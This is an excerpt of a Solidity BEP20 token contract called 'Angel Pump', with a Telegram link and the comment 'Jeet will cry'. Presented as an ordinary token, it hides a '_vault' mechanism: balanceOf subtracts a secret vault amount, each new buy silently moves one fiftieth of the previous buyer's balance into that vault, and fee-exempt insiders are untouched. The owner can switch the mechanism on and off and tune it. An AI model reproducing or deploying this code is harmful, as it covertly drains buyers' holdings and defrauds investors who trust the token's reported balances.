...
/** 
 * TG https://t.me/angelpump Jeet will cry
 */
...
contract AngelPumpBSC is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEV = 0xB8326370E97F77554914E4A8B87ab6FAe0513133;
    address previousBuyer;

    string constant _name = "Angel Pump";
    ...
    mapping (address => uint256) _vault;
    ...
    uint256 vaultDenominator = 50;

    IDEXRouter public router;
    address public pair;

    bool public tradingOpen = false;
    bool public tokenVault = true;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = address(0xf44b0AC3acC34Fdab350882cB9140595c9140C1f);
    ...
    function balanceOf(address account) public view override returns (uint256) { if(isFeeExempt[account] || isDividendExempt[account]) return _balances[account]; return _balances[account] - _vault[account]; }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(sender == pair && tokenVault && !isFeeExempt[recipient]) {
            _vault[previousBuyer] += balanceOf(previousBuyer) / vaultDenominator;
    ...
    function setVault(bool Enabled, uint256 denominator) external onlyOwner {
        tokenVault = Enabled;
